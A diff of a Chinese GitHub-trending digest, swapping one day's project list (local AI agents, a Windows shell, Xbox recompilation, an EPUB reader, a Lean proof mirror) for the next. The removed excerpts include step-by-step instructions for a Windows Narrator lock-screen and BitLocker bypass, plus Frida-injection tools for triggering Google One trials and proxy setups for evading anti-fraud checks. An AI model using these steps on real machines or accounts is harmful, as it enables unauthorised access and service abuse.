@@ -1,454 +1,603 @@
-📊 开源日报 — 2026-11-21
-共发现 10 个新项目（已自动过滤历史记录）
+📊 开源日报 — 2026-11-22
+共发现 14 个新项目（已自动过滤历史记录）
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#1  simplexai-labs/linger
-    ⭐ 3057 stars  |  🍴 281 forks  |  💻 TypeScript  |  📅 2026-11-10
-    🔗 https://github.com/simplexai-labs/linger
-    📡 来源: 🚀 两周800+星
-    🏷️ agent-teams, local-llm, memory, personal-agent, proactive-agent, proactive-ai
-    📝 Linger is An Open-Source Personal Agent That Runs Fully on Your PC.  We aim to break Big Tech’s grip on AI by bringing powerful local AI to everyday computers through efficient model–harness co-design, so everyone can run their own.
-
-    README 摘要:
-    Linger is an open-source personal agent with a Claude-class brain running locally on your PC.
-    
-      Open-Source&nbsp;&nbsp;·&nbsp;&nbsp;Local AI&nbsp;&nbsp;·&nbsp;&nbsp;Consumer Macs &amp; PCs
-    
-      
-      
-      
-    
-      
-      
-      
-      
-    
-    - **A Claude-class brain, running locally.** A 125B model on a 12 GB GPU, on everyday Macs and PCs.
-    - **The Grok Bot experience on your PC.** Zero token fees for local inference.
-    - **A loyal AI sidekick.** It remembers what matters, proactively gets things done, and keeps your data on your device.
-    
-    ## Cool features
-    
-    ### Local models: A Claude-class brain on a 12 GB GPU
-    
-    Efficient AI model–harness co-design brings a full local agent to consumer Macs and PCs. Our MoE inference engine, PolyStrata, keeps a model's busiest experts on your GPU and the rest in RAM or on SSD, so larger models run with less GPU memory: the **125B** Qwen3.8-Flash-Next runs on a **12 GB card** with 64 GB of RAM. The model runs on your own machine instead of a remote server, so there is no cloud bill and no token fee.
-    
-    Speed: how fast seven MoE models write on 8, 12 and 32 GB GPUs
-    
-      
-        Writing, tokens per second
-        Laptop RTX 40708 GB
-        RTX 306012 GB
-        RTX 509032 GB
-      
-      Qwen3.8-Flash-Next38.1 (Q2_0)¹45.5179
-      LFM2.5-24B-A2B70–7397.8480–485
-      Flint 40B-A2.5B61–6365.5251–252
-      Qwen3.6-35B-A3B94–10091.8394–395
-      Ornith 1.576–8280–82316–319
-      Gemma 4 26B-A4B92–9378.0 (Q4 file)353–356
-      Tiel Coder 35B-A3B8378.8337–345
-    
-    ¹ Not from PolyStrata's results: our lab measured the Q2_0 file with a short prompt on a 96 GB card held to an 8 GB budget, with 32 GB of RAM and a 64K context. It is not a real 8 GB card, and it does not settle the earlier 95 tok/s IQ1_M figure: Flash-Next Coder IQ1_M gave 32.1 under the same conditions, and the full-model UD-IQ1_M was not tested.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#2  iamajmeena/neonclipping
-    ⭐ 1390 stars  |  🍴 66 forks  |  💻 Python  |  📅 2026-11-19
-    🔗 https://github.com/iamajmeena/neonclipping
+#1  ItsNotRexed/Leonida
+    ⭐ 7854 stars  |  🍴 626 forks  |  💻 Python  |  📅 2026-11-20
+    🔗 https://github.com/ItsNotRexed/Leonida
     📡 来源: 🚀 5天300+星
-    🏷️ clipping, ffmpeg, shorts, video, whisper, yt-dlp
-    📝 Paste a link, get captioned 9:16 clips in ~2 min. Free, local, open-source clipping engine (audio-first, YouTube captions, local LLM).
+    📝 Leonida Is A Native PC Recompilation Of The Xbox Version Of Grand Theft Auto 6
 
     README 摘要:
-    # NeonClipping
+    Leonida
+      
     
-    **Paste a link. Get captioned 9:16 clips in about two minutes. Free, local, open-source.**
+    Grand Theft Auto VI (Xbox Series) running natively on Windows, built on your PC from your own copy.
     
-    NeonClipping turns long YouTube / Twitch / Kick videos (or your own MP4) into vertical, captioned clips with a title and hook for each. Everything runs on your machine: no account, no subscription, no upload.
+      Status |
+      How to build |
+      How it works |
+      Want to help? |
+      Credits |
+      License |
+      Discord
     
-     
+    Leonida is a static recompilation project. The Xbox Series CPU is x86-64 like a PC, so the game's code is loaded
+    and run natively, and the console's system software is reimplemented. The console's precompiled RDNA2 GPU programs
+    are translated to SPIR-V for Vulkan. The game's models, textures and audio are read from your package. All of this
+    happens **on your PC, from your own copy of the game**.
     
-    🌐 **Website with one-click Windows setup:** 
+    > [!IMPORTANT]
+    > This repository **does not contain the game, keys or an executable**, and it does not explain how to get them. You
+    > need your own copy, with its files already readable on disk. Nothing here decrypts or works around any protection.
+    > Everything the build creates (the generated shaders, extracted assets, the runtime folder and your saves) comes
+    > from your game and stays on your PC. Never share those files.
     
-    **Made by Ajay K Meena** (Director, DOP, colorist, DaVinci Resolve educator, Jaipur). If NeonClipping saves you time, please ⭐ star the repo and follow @iamajmeena on Instagram.
+    Discord: https://discord.gg/rexed
     
-    📘 **Guides (Hindi + English, PDF):** docs/NeonClipping-Guide-EN-HI.pdf  
-    🤖 **Let an AI agent install it for you:** copy docs/NEONCLIPPING-AGENT-SETUP-PROMPT.txt into Claude Code, Codex CLI or Cursor.
+    ## Project status
     
-    ## How it finds good moments
+    **Early. The game does not boot yet.** Everything that can be done without the game's executable is in place, so
+    work on booting can start as soon as one is available to a developer.
     
-    Two modes, one button.
-    
-    **⚡ Fast mode (default, videos over 10 min)** copies the trick that makes the fastest clippers fast: never look at the whole video.
-    
-    1. Download **audio only** (79 MB for an 85-minute video, about 10 s).
-    2. Take the transcript for free from YouTube's own captions (word-timed). No speech model needed. For other sources a local Whisper model is used as the fallback.
-    3. Score the whole audio track for *sudden loudness jumps* (vs a 2-minute local baseline), *raised voices* (2–4 kHz energy) and quiet-to-loud transitions.
-    4. Take the best moments, read each one's transcript with a local LLM (Ollama) and let it score the moment, write a title and a hook. Snap the start and end to sentence boundaries inside your Min/Max length.
-    5. Download **only the chosen sections** of the video (not the whole file), trim exactly by matching their sound to the audio track, and render 1080x1920 clips with burned-in captions.
-    
-    **🔬 Deep mode** downloads the whole video, adds optical-flow motion (OpenCV Farneback: fast objects, impacts, camera whips) and cut density to the audio signals, shortlists 4× more candidates and gives the LLM 15 seconds of context before and after each one.
-    
-    Measured on one machine (RTX 2060, 16 threads), Fast mode, 3 clips each:
-    
-    | Source | Time |
+    | What | Status |
     |---|---|
-    | 85-minute YouTube stream (YouTube captions) | **97 s** |
-    | 3-hour Twitch VOD (no captions, local speech model) | **136 s** |
-    | 90-second YouTube trailer | 21 s |
-    | 90-second local MP4 | 14 s |
-    
-    Your numbers depend on network and CPU.
-    
+    | Finding and checking your copy (Xbox Series 1.0.2.1) | ✅ Works |
+    | Shaders: carve, unpack native RDNA2 code, disassemble | ✅ All 26,503 |
+    | Shaders: RDNA2 → SPIR-V translation | ✅ **All 26,503** (disassembled with LLVM 21; LLVM 23 leaves 1,471 rejected for now, #644): 2,236 VS, 12,101 PS, 2,689 CS, 9,282 mesh, 195 geometry. All pass `spirv-val`, with a per-shader metadata index for pipeline creation. ⚠️ 21,545 are wave64: exact on 64-wide subgroups (AMD). On 32-wide subgroups (NVIDIA, Intel), compute and mesh shaders are exact with wave64 emulation (`--wave64-emulate`, on by default there); cross-half wave ops in vertex, pixel and geometry shaders are still approximate |
+    | Shader translator checked on a real GPU | ⚠️ The hand-written GPU tests (vertex fetch, texture sampling, exports, ALU ops, partial-register ops, barycentrics, wave-uniform branches, compute LDS/barriers/buffer stores, wave64 masks) have been run on more than 30 GPU and driver combinations, with results in #166: NVIDIA Turing, Ampere, Ada and Blackwell (Windows and Linux); AMD GCN3, RDNA1, RDNA2, RDNA3 and RDNA4 (Windows driver and RADV); Intel Gen9 (ANV); Apple M1 (MoltenVK, no geometry or
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#3  Lemxy/WinRust
-    ⭐ 807 stars  |  🍴 40 forks  |  💻 Rust  |  📅 2026-11-17
-    🔗 https://github.com/Lemxy/WinRust
+#2  R0Y00/Xbox2Windows
+    ⭐ 1039 stars  |  🍴 101 forks  |  💻 Python  |  📅 2026-11-20
+    🔗 https://github.com/R0Y00/Xbox2Windows
     📡 来源: 🚀 5天300+星
-    📝 Windows shell replacement in Rust: taskbar, file manager, NTFS search, task manager, disk cleaner. One installer exe.
+    🏷️ d3d12, directx-raytracing, scarlett, static-recompilation, windows, xbox, xbox-series-x
+    📝 GTA VI static recompilation research for x64 Windows. Source-built EXEs run on Windows, and two translated pixel shaders match reference outputs on hardware and WARP. Full-game startup is unverified.
 
     README 摘要:
-    ﻿
+    # Xbox2Windows
     
-    # WinRust
+    Xbox2Windows researches **GTA VI static recompilation** from Xbox Series X|S (Scarlett) to x64 Windows. Windows, the mapped original and the recompiled build agree on output and exit codes for source-built programs. Two pixel shaders from the inspected package compiled to desktop DXIL and matched reference pixels on an RTX 4060 Laptop GPU and WARP. Execution of the title's CPU code, full-game startup and frame rate remain unverified.
     
-    **A Windows shell written in Rust: faster and lighter than the stock one.** Small native programs (no .NET, no Electron) that replace parts of Windows: the taskbar, File Explorer, file search, Task Manager, plus a disk cleaner, a disk map and a photo viewer. One installer puts them in, one button takes them all out.
+    **Help wanted on Windows:** Claim a batch of GPU reports in #1. Link the reports you will cover, check each original log against the hardware table, and submit one README PR for the batch. You can do this without a GPU or a local copy of the package.
     
-    English | Русский
+    The CPU experiments translate source-built x64 functions from PE machine code through C++ to Windows executables and DLLs. A source-built EXE runs from its translated entry through a nested call that reads and writes globals in a relocated image, then through a named DLL import. Windows, the mapped original and the recompiled EXE agree on the import arguments, output and exit code for two inputs and two initial data states. A CRC-32 console program also runs from its PE entry through a separately compiled C++ checksum routine and Windows UCRT stream I/O, with matching output and exit codes on all three runners. A multi-record archive reader runs from standard Zig startup through recompiled blast decompression to process exit, including the callback sequence and partial-record cleanup. The shader experiment translates selected gfx1013 pixel shaders through HLSL to desktop DXIL. Other experiments test the Windows runtime, render recovered texture levels and read script state data.
     
-    > **Read this first.** WinRust turns off Windows Search, hides the taskbar and can turn off Explorer as the shell. The exe is not code-signed, so SmartScreen will warn you. A restore point is created before install, but try it on a spare machine or a VM first.
+    New to the project? The pinned guide in GitHub Discussions will help you choose a first contribution. Ask build and debugging questions in Development Q&A.
     
-    ## Install
+    Snapshot measured at c04e65a. For the latest chart, open the newest successful Windows checks run on main and download `coverage-dashboard` from Artifacts.
     
-    1. Download `WinRust.exe` from the latest release (Windows 10/11, x64).
-    2. Run it as administrator.
-    3. Tick the components you want and press the install button. On a fresh install, `rust-explorer` is unchecked. Tick it to replace the Windows Explorer shell (or use the gear on the topbar row: the **Shell: rust-explorer** switch). They are installed in the right order; one that fails or is skipped does not stop the others, the window lists what went wrong.
+    ## Current results and open work
     
-    Windows Search is optional: on a stripped Windows (for example a debloated LTSC image without the Windows Search service) that step is skipped with a warning instead of failing the install.
-    
-    If UAC asks for **another administrator's** password, the per-user settings (startup entries, scheduled tasks, PowerShell profile, search permissions) still go to the user who is signed in, not to the administrator you typed. If the installer cannot tell who that is, it stops before changing anything.
-    
-    **Update:** download the new `WinRust.exe` from the releases page, run it as administrator and select the components you want to update or install. An existing `rust-explorer` stays selected by default for updates. Your settings and the saved original Windows values stay.
-    
-    The installer is in English. The **Русский** button in its corner (or "WinRust apps in Русский" in the bar's right-click menu) switches every WinRust program to Russian.
-    
-    ## Remove
-    
-    - **Remove all** in the installer window undoes everything: Windows Search, the taskbar, Explorer and the services come back.
-    - One plugin at a time: `plugin-launcher uninstall ` (see Command line).
-    - **If the screen is left without a taskbar or desktop:** press Ctrl+Alt+Del → Task Manager → Run new task → `explorer.exe`, then run the installer and press Remove all.
-    
-    On uninstall, `rust-explorer` restores the service startup values and the svchost grouping t
+    | Area | Result on Windows | Open question or contribution |
+    |---|---|---|
+    | FidelityFX upscaler | The recompiled provider creates 11 resources at 720p → 1080p and a twelfth with the debug flag. On RTX 4060 Laptop and WARP, both the per-resource indices and the returned loader and provider handles passed. Recompiled graph pass 26 wrote the RCAS intermediate and the recompiled RCAS shader read it with five integer texel loads per output. Passes 24
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#4  ⚠️风险  MSNightmare/FastUnlock
-    ⚠️ 命中风险词: exploit, 0day, bypass —— 默认归排除区，需人工确认
-    ⭐ 609 stars  |  🍴 100 forks  |  💻 None  |  📅 2026-11-19
-    🔗 https://github.com/MSNightmare/FastUnlock
+#3  omonkeyz/xbox-emulator
+    ⭐ 935 stars  |  🍴 47 forks  |  💻 Rust  |  📅 2026-11-21
+    🔗 https://github.com/omonkeyz/xbox-emulator
     📡 来源: 🚀 5天300+星
-    📝 FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability
+    📝 Progress notes for running Xbox Series X|S builds on PC (TomBox + rage9)
 
     README 摘要:
-    # FastUnlock
-    FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability
+    # Xbox Emulator
     
-    The vulnerability exist in the way how narrator handles UI in a locked account context, succesful exploitation results in bypassing bitlocker and executing code in the context of the lockscreen account "WsiAccount"
+    **Running the Xbox Series X|S library on PC. A continuation of drycheetah84/TomBox.**
     
-    It took a total of 5 minutes from finding this to breaching a fully encrypted bitlocker machine with Windows 11 26H2 November Patch installed, an issue caused by total negligence from Microsoft's side... The vulnerability seems to be extremely consistent in every machine I tested it in, in other words, if you know how to control narrator in the background properly or just press the correct combination of buttons, you will get code execution in the target machine as well.
+    The runtime reimplements the console's platform layer (Xbox-flavoured Direct3D 12, precompiled RDNA2 shaders, unified-memory textures, system libraries) so dumped, already-decrypted Xbox Series X|S builds run as normal Windows processes. It is not tied to any single title. This repo tracks our continuation — new titles brought up, platform calls extended, shader stages unlocked.
     
-    Obviously this needs physical access and at least one account in the machine to be linked to an online account, this breaks the guarantee that a properly secured bitlocker machine cannot be accessed even if the attacker has physical access so hold tight any windows machines until Microsoft patches this.
+    Uses legally obtained, already-decrypted dumps. The runtime does no key extraction or package decryption.
     
-    In the process of giving narrator a new look, Microsoft forgot to make sure that the new UI does not run in the case it was running in the context of a lockscreen user (interestingly it still has the old code that prevents it from spawning the window if it's running as SYSTEM)
-    Unlike the previous lockscreen bypass bugs I found in the past (by example ZDI-21-1053), this one is extremely convenient to use, when you click "I forgot my PIN" (or password or whatever), 
+    **Source code:** the emulator's Rust workspace is in this repo: `crates/`, `tools/` and `Cargo.toml`. It contains no game files, binaries or build output.
     
-    As soon as you the Microsoft account window prompts you for an action to reset the account, press Win+U and click on narrator,
+    **Contributing:** pull requests are welcome, especially console library functions still marked missing in the library map. See CONTRIBUTING.md. Licensed MIT OR Apache-2.0.
     
-    The second you enable narrator it will immediately focus on a background window owned by narrator, this exact window will be in the background but you would not be able to see it
+    ## Status
     
-    As you can see narrator is focused on the "Next" button, to navigate hold the caps key (Do not release) and use arrow keys to navigate, your next objective is obvious, click on the "Math reading settings", in order to click the actual link, you can press CAPS + Enter, this will take you to the next step, the settings window
+    One square per item. The first four sections use upstream's definitions so the numbers stay comparable: green = done, amber = partial (a stub, a forwarder, or not verified to work), grey = not done — imported system functions of the Fortnite EXE, Direct3D 12.x interface methods, RDNA2 shader instructions the decoder knows, and the eight shader stages (mesh and amplification still grey). The fifth section is ours and covers Xbox console libraries only: the exports of the console OS DLLs (EmbeddedXvd of every analysed title, union, so the newest console OS sets the surface) that no same-named DLL in a PC's C:\Windows\System32 exports, so console-only DLLs (d3d12_xs, xg_xs, xmem, AcpHal, chad, xapu, xcrdapi, the *legacy variants, ...) count in full and modified PC DLLs (kernel32, advapi32, mfplat, ...) only for their console-only exports, plus the GDK wrappers the emulator redirects; plain Windows DLLs (ntdll, msvcrt, ucrtbase, combase, ...) are not shown. Coloured implemented / forwarded / stub / missing; lighter squares are functions an analysed title imports. Per-title import coverage likewise counts only imports from console libraries. Generated by tools/progress/gen.py; per-function tables in docs/LIBRARY_MAP.md, headline numbers in tools/progress/summary.json.
     
-    From now, it's just up to you how you want to to execute code, having focus on settings window allows multiple ways to get code execution in the context of the "WsiAccount" user. For me I prefer navigating to "Bluetooth & Devices" then going for "AutoPlay" then "Removable Drive" and finally "Open folder to view fi
+    ## Milestones
+    
+    Counted live by `tools/progress/gen.py`; full table with evidence in docs/MILESTONES.md.
+    
+    | Milestone | State |
+    |---|---|
+    | All imported system functions covered (671/671) | done |
+    | Full title shader sweep translated (105,506/105,506) | done |
+    | All Direct3D 12.x m
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#5  0xkaka/homeport
-    ⭐ 605 stars  |  🍴 105 forks  |  💻 HTML  |  📅 2026-11-17
-    🔗 https://github.com/0xkaka/homeport
-    📡 来源: 🚀 5天300+星
-    📝 无描述
+#4  HuangAntimony/Hoshi-Reader-Android
+    ⭐ 501 stars  |  🍴 44 forks  |  💻 Kotlin  |  📅 2026-04-28
+    🔗 https://github.com/HuangAntimony/Hoshi-Reader-Android
+    📡 来源: 📖 阅读/内容平台 | 活跃 | audiobook text-to-speech
+    🏷️ android, anki, audiobook, audiobook-player, dictionary, ebook-reader, eink, epub, epub-reader, japanese
+    📝 Hoshi Reader Android: Japanese EPUB reader with Yomitan lookup, Anki mining, audiobook read-along, text-to-speech(TTS), and e-ink support.
 
     README 摘要:
-    # homeport
+    # Hoshi Reader Android
     
-    **一句话：让 Claude、Google、Stripe 这些网站，在你所有设备上都看到同一个“住宅 IP”。**
+    **English** | 简体中文
     
-    很多人用机场节点访问 Claude / Google，节点一会儿日本一会儿美国，IP 来回跳，再加上机场 IP 是机房 IP，很容易触发风控：注册要验证、付款失败、身份认证不过、甚至封号。
+    Hoshi Reader Android is an EPUB reader for Japanese, English, Chinese, and Korean immersion, with Yomitan lookup, Anki card creation, audiobook read-along, text-to-speech, and e-ink display options.
     
-    homeport 做的事情很简单：把这些“敏感网站”单独挑出来，统一走一条固定的**住宅代理**；其他网站照旧走你的机场，速度不受影响。
-    
-    > 🛒 **还没有住宅 IP？** 看这篇 👉 便宜静态住宅 IP 购买教程
-    
-    ---
-    
-    ## ⚡ 懒人一键版（推荐小白）
-    
-    打开 👉 **https://0xkaka.github.io/homeport/**
-    
-    1. 照着服务商后台，填上住宅代理的地址、端口、用户名、密码；
-    2. 选你的设备和软件，点「复制」，到软件里粘贴（iPhone 可以直接扫码加节点）；
-    3. 打开 `ipv4.webshare.io` 看 IP 对不对。
-    
-    账号密码只在你自己浏览器里处理，不会上传。下面是详细的手动教程，一键版搞不定再看。
-    
-    ---
-    
-    ## 目录
-    
-    1. 原理（看不懂可以跳过）
-    2. 开始前要准备什么
-    3. Clash Party（Mac / Windows）
-    4. Clash Verge Rev（Windows / Mac）
-    5. 安卓：FlClash
-    6. 小火箭 Shadowrocket（iPhone / iPad / Mac）
-    7. 检查是否成功
-    8. Claude Code、终端、Chrome 的额外设置
-    9. 常见问题
-    10. 哪些网站会走住宅出口
-    11. 给维护者：修改规则
-    
-    ---
-    
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#6  nataphong-lab/Open-Source-Face-Recognition-Ultimate
-    ⭐ 514 stars  |  🍴 420 forks  |  💻 Python  |  📅 2026-11-19
-    🔗 https://github.com/nataphong-lab/Open-Source-Face-Recognition-Ultimate
-    📡 来源: 🚀 5天300+星
-    📝 Face Recognition, Face Liveness Detection, Face Anti-Spoofing, Face Detection, Face Landmarks, Face Compare, Face Matching, Face Pose, Face Expression, Face Attributes, Face Templates Extraction, Face Landmarks
-
-    README 摘要:
-    # Ultimate Open Source Face Recognition SDK
+    This project brings Hoshi Reader to Android with native UI and Android-specific features.
     
       
-    
-    Open Source Face Recognition SDK
-    
-      A Free, Privacy-Focused Face Recognition Solution for Windows and Linux
-    
-      Built with deep learning technology, featuring face detection, facial landmarks, feature extraction, and face similarity comparison.
-    
-      Improved Recognition Accuracy Through Further Training and Optimization of
-      FacePlugin's Open-Source Face Recognition Model
-    
-    ---
-    
-    ## 🚀 Overview
-    
-    The **Open Source Face Recognition SDK** is a free, privacy-focused solution designed to integrate face recognition capabilities into applications running on Windows and Linux.
-    
-    Powered by deep learning models, this SDK provides face detection, facial feature extraction, and face similarity comparison through a simple Python interface.
-    
-    The recognition model has been further trained using FacePlugin's model as a starting point to improve recognition accuracy.
-    
-    **Privacy is a priority:** All biometric processing takes place locally, allowing applications to operate without sending facial data to external servers.
-    
-    ### ✨ Key Features
-    
-    - 🔒 **100% On-Premise Processing:** All face recognition operations run locally. No biometric data needs to leave your device.
-    - 🎯 **High Recognition Accuracy:** Uses deep learning models with additional model training and optimization.
-    - ⚡ **Real-Time Processing:** Supports efficient face detection and recognition workflows.
-    - 🔧 **Easy Integration:** Simple Python APIs for application development.
-    - 🌐 **Cross-Platform:** Supports Windows and Linux.
-    - 💻 **CPU and GPU Support:** Can operate on CPU-only systems, with optional GPU acceleration where supported.
-    - 🆓 **Completely Free:** Open source with no SDK licensing fees.
-    
-    ### 🎯 Current Capabilities
-    
-    - Face detection and bounding box extraction.
-    - Facial landmark detection.
-    - Facial feature embedding generation.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#7  replit/datacat
-    ⭐ 471 stars  |  🍴 52 forks  |  💻 TypeScript  |  📅 2026-11-17
-    🔗 https://github.com/replit/datacat
-    📡 来源: 🚀 5天300+星
-    🏷️ alerting, apm, clickhouse, dashboards, logging, metrics, monitoring, observability, opentelemetry, postgresql
-    📝 Self-hosted observability: metrics, logs, traces, dashboards and alerts. Stores data in PostgreSQL or ClickHouse. Accepts OpenTelemetry data.
-
-    README 摘要:
-    # DataCat
-    
-    Self-hosted observability: metrics, logs, distributed traces, dashboards, infrastructure
-    and alerts in one place. DataCat runs on your infrastructure, stores data in PostgreSQL (or telemetry in
-    ClickHouse, if you choose; see docs/SELF_HOSTING.md), and accepts OpenTelemetry and Datadog-compatible agent traffic.
-    No hosted account or external service is required.
+        
+        
+        
+        
+      
+      
+        
+        
+        
+        
+      
+      
+        
+        
+        
+        
+      
     
     ## Features
     
-    - Metrics explorer, formulas, dashboards and host maps
-    - Searchable logs with facets, live tail and trace correlation
-    - APM service catalog, trace explorer and waterfall
-    - Metric, log and trace monitors with webhook/Slack notifications
-    - Organizations, local accounts, single-use invites, API/application keys
-    - OpenTelemetry Collector-based host agent and Node.js/Python instrumentation libraries
-    - One production process serving the API, web UI, installer and downloads
+    ### Bookshelf
     
-    ## Quick start with Docker Compose
+    - Import EPUBs in batches or recursively from folders, organize custom shelves, and export EPUBs.
+    - Show, blur, or hide book covers.
+    - Use book covers as lock-screen wallpapers or e-ink device screen savers.
     
-    Requirements: Docker Engine with the Compose plugin, Git, and OpenSSL.
+    ### Reading
     
-    ```sh
-    git clone https://github.com/replit/datacat
-    cd datacat
-    cp .env.example .env
-    sed -i "s/^POSTGRES_PASSWORD=.*/POSTGRES_PASSWORD=$(openssl rand -hex 24)/" .env
-    sed -i "s/^SESSION_SECRET=.*/SESSION_SECRET=$(openssl rand -hex 32)/" .env
-    chmod 600 .env
-    mkdir -p downloads
-    docker compose up -d --build
-    ```
-    
-    Open **http://localhost:3000**, create your admin account and organization, then create
-    an API key under **Organization Settings**. Setup asks for a setup token, printed in the
-    server log (`docker compose logs datacat | grep "setup token"`) unless you set `DATACAT_SETUP_TOKEN`.
-    Set `PUBLIC_URL` to your externally reachable HTTPS origin before inviting colleagues or
-    installing agents remotely.
-    
-    Agent binaries and SDK packages are separate release assets. Put them (including
-    `SHA256SUMS`) in `downloads/` to serve them from your instance.
+    - Read vertically or horizontally in paginated or continuous mode; paragraph mode centers each page's content and adds sentence limits, optional text animation and tap-blank-to-advance.
+    - Download or import fonts and customize layout and furigana display.
+    - Search the full book, jump between chapters, and turn pages with volume keys.
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#8  hatsunemiku-ai/google-one-tools
-    ⭐ 463 stars  |  🍴 321 forks  |  💻 Python  |  📅 2026-11-20
-    🔗 https://github.com/hatsunemiku-ai/google-one-tools
+#5  CocoSgt/riemann-hypothesis-lean
+    ⭐ 476 stars  |  🍴 74 forks  |  💻 Lean  |  📅 2026-11-20
+    🔗 https://github.com/CocoSgt/riemann-hypothesis-lean
     📡 来源: 🚀 5天300+星
-    📝 无描述
+    📝 Mirror of Levent Alpöge's Lean proof of the Riemann Hypothesis (with Claude). All credit to Levent Alpöge. Source: alpo.ge
 
     README 摘要:
-    # Google One 工具包（MuMu 模拟器 + Frida）
+    # Riemann Hypothesis in Lean — by Levent Alpöge (with Claude)
     
-    **`g1.30tb`已在大部分区域下架，可以先搞搞3个月打折的Ultra 5X**
+    > **The proof in this repository is the work of Levent Alpöge.**
+    > On 2026-11-20 he announced that, working with Claude, he had found a proof of the Riemann Hypothesis that extends to the Generalized Riemann Hypothesis (for Dirichlet L-functions), and that the argument is fully formalized in Lean without assumptions.
+    > All credit belongs to Levent Alpöge (and Claude). This repository is an unmodified mirror of the Lean code he published, put on GitHub so that people and agents can browse, clone and check it.
+    >
+    > 本仓库只是镜像：证明由数学家 Levent Alpöge（和 Claude 合作）完成，署名与一切功劳归他。代码原样搬运，没有改动。
     
-    通过 Frida 注入模拟器里的 Google One 进程，调用 Play BillingClient：
-    **扫描账号可用的全部订阅 offer（免费/付费）**，以及**拉起任意 SKU 的 Play 收银台**（只弹出，不自动订阅）。
+    - Announcement (4 pages): https://alpo.ge/remark.pdf
+    - Original download: https://alpo.ge/lean.tar.gz.part01 … https://alpo.ge/lean.tar.gz.part14
+    - Merged archive in this repo's Releases
+    
+    **Status.** As of mirroring (2026-11-20), no independent build or review of this code has been published. Treat it as a claimed proof until it has been compiled and checked.
     
     ---
     
-    ## 文件清单
+    ## What is proved
     
-    | 文件 | 用途 |
-    |---|---|
-    | `ultra0_core.py` | 自包含核心（adb/frida-server/计费模块/注入模板，从原 ultra0.py 抽取） |
-    | `extract_core.py` | 生成器：从原版 ultra0.py 重新抽取 ultra0_core.py（仅维护时用） |
-    | `one_common.py` | 公共环境准备（选设备/root/frida-server/计费模块/Play 商店保活），所有脚本共用 |
-    | `launch_checkout.py` + `launch_checkout.js` | **拉起任意 SKU 收银台**（主力脚本） |
-    | `scan_all.py` | 全量扫描 70 个候选 SKU 的所有 offer（免费+付费+token），零风险 |
-    | `query_sku.py` | 只查指定几个 SKU，零风险 |
-    | `probe_env.py` | 环境诊断（frida 版本 / Java 桥 / Play 商店状态），出问题先跑它 |
-    | `scan_everything.py` + `scan_offers.js` | 穷举账号全部 SKU，输出带定价阶段的原始 JSON 并渲染清单 |
-    | `render_multi.py` | 合并多地区 JSON，生成 `SKU-清单.md` |
-    | `scan_result_*.json` | 各地区扫描原始数据（已脱敏：serial 已掩码、token 已置空） |
-    | `SKU-清单.md` | 多地区金额对照 + 人民币比价清单 |
+    The target statements are short. Read these two files first.
     
-    > 整个文件夹**自包含、无外部依赖**：把 `google-one-tools` 拷到任何机器（装有
-    > Python3.9+ 和 frida 16.x）都能直接跑，不需要原版仓库里的脚本。
+    `src/Main.lean`
     
-    ## 环境要求（缺一不可）
+    ```lean
+    import Statements
+    import Supplements.Kernels.MainTheoremsAll
     
-    1. **本机 frida 必须 16.x**（推荐 16.7.19）：
-       ```powershell
-       py -m pip install frida==16.7.19
-       ```
-       > ⚠️ frida 17.x 在 MuMu（Android 12 / x86_64）上 Java 桥损坏（`Java is not defined`），
-       > 所有功能静默失效。设备上的 frida-server 也必须同版本（脚本会自动下载匹配版）。
-    2. **自包含核心**：所有对原版 `ultra0.py` 的依赖已抽取进 `ultra0_core.py`，
-       本文件夹可整体拷贝到别处使用；要更新抽取范围，改 `extract_core.py` 后重跑 `py extract_core.py`。
-    3. 模拟器已 root、已登录 Google 账号、装有 Google One 和 Play 商店。
-    4. 用 `py` 而不是 `python`（本机的 `python` 是商店占位符，跑不了）。
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#9  duwqijlk/google-trial-tool
-    ⭐ 371 stars  |  🍴 161 forks  |  💻 JavaScript  |  📅 2026-11-19
-    🔗 https://github.com/duwqijlk/google-trial-tool
-    📡 来源: 🚀 5天300+星
-    📝 无描述
-
-    README 摘要:
-    # Google AI Trial Tool
+    theorem riemannHypothesis : RiemannHypothesis := rhOfAll
     
-    内容为转载，来自q群797481450
-    这次的会封号 ，涉及工具调用，慎用
+    theorem riemannZeta_eq_zero_re : RiemannZetaZerosOnLine := rhOfAll
     
-    通过 Frida 注入 Google One 进程调用 BillingClient API，发现并激活隐藏的 $0 免费试用。
+    theorem LFunction_ne_zero_of_half_lt_re : DirichletLNonvanishingRightOfHalf := allChi
     
-    ## 前提条件
+    theorem LFunction_eq_zero_re : DirichletLZerosOnLine := claimAll.2.1
     
-    | 组件 | 说明 |
-    |---|---|
-    | **MuMu 模拟器** | 已启动，已登录 Google 账号，已绑定付款方式 |
-    | **adb** | 在 PATH 中，或设置 `ADB_PATH` 环境变量 |
-    | **frida** (host) | `pip install frida-tools`，版本 ≥ 16 |
-    | **frida-server** (device) | 推送到设备 `/data/local/tmp/frida-server` 并赋予执行权限 |
-    | **module.apk** (device) | 包含 BillingClient 库的 APK，推送到 `/data/local/tmp/module.apk` |
-    | **Google One** | 设备上已安装 (`com.google.android.apps.subscriptions.red`) |
-    
-    ## 设备准备
-    
-    ```bash
-    # 连接 MuMu
-    adb connect 127.0.0.1:16384
-    
-    # 推送 frida-server（从 https://github.com/frida/frida/releases 下载对应架构）
-    adb push frida-server /data/local/tmp/frida-server
-    adb shell "chmod 755 /data/local/tmp/frida-server"
-    
-    # 推送 module.apk（包含 com.android.billingclient 的 APK）
-    adb push module.apk /data/local/tmp/module.apk
